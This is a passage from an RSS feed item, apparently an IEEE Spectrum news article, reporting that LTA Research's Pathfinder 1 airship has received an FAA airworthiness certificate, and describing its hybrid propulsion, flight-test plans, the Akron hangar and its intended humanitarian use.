distributed on the sides and tail of the airship, and four fin rudders, allow for vertical takeoff and landing (VTOL) and <a href="https://spectrum.ieee.org/airship" target="_self">speeds of up to about 120 kilometers per hour</a>. A tough layer of <a href="https://www.dupont.com/brands/tedlar.html" target="_blank">laminated Tedlar material</a> contains 13 helium bags of ripstop nylon, which contain lidar systems to track the gas levels within. </p><p>Pathfinder 1 has a hybrid propulsion system, with two 150 kilowatt diesel generators working alongside 24 batteries to provide power for the electric motors, according to a <a href="https://aviationweek.com/aerospace/advanced-air-mobility/ltas-large-rigid-airship-gets-airborne" rel="noopener noreferrer" target="_blank">recent presentation</a> by LTA’s CEO, Alan Weston. He said that LTA has plans to use hydrogen in later versions of the airship, perhaps as fuel for future fuel cells or turbogenerators, and possibly even as a lifting gas. </p><p>LTA confirmed the airworthiness certificate had been granted but not provide any further details.</p><p>Although the Pathfinder 1 is designed for single pilot operation, it has dual controls and, according to LTA’s letter to the FAA, will have a second pilot on board “for initial flight testing until pilot workload can be assessed.” The gondola that LTA is using for the airship was designed by the famous Zeppelin company in Germany and can <a href="https://spectrum.ieee.org/sergey-brins-revolutionary-20-airship" target="_self">accommodate up to 14 people</a>, although no superfluous passengers will be allowed during testing. </p><p>After extensive flight testing in California, the Pathfinder 1 will transit to the former <a href="https://en.wikipedia.org/wiki/Goodyear_Airdock" target="_blank">Goodyear Airdock</a> airship hangar in Akron, Ohio, which the company has acquired as its future manufacturing location. There, an even larger 180-meter long airship, the Pathfinder 3, is already under development. </p><p>Ultimately, LTA intends its aircraft to be used for humanitarian missions, deploying cargo and personnel to areas that are inaccessible by road. Brin runs a separate non-profit, called <a href="https://gsd.ngo/en" rel="noopener noreferrer" target="_blank">Global Support and Development</a>, that has already carried out such missions by sea, in the Caribbean, Latin American and the South Pacific. It originally used Brin’s own superyacht to ferry medical personnel to the scene of hurricanes and other disasters, and recently launched a purpose built vessel capable of transporting dozens of medical staff and full-size shipping containers. The <a href="https://gsd.ngo/en/what-we-do/humanitarian-vessel" rel="noopener noreferrer" target="_blank">MV Dawn</a> also carries its own watercraft and vehicles, and is capable of producing and off-loading bulk supplies of fresh water, and could be a model for future humanitarian airships. </p><p>Pathfinder 1’s airworthiness certificate is valid for a full year although LTA told the FAA in its application letter that it expects the test program to be complete within 180 days. </p></div></div>]]></description>
        </item>
    </channel>
</rss>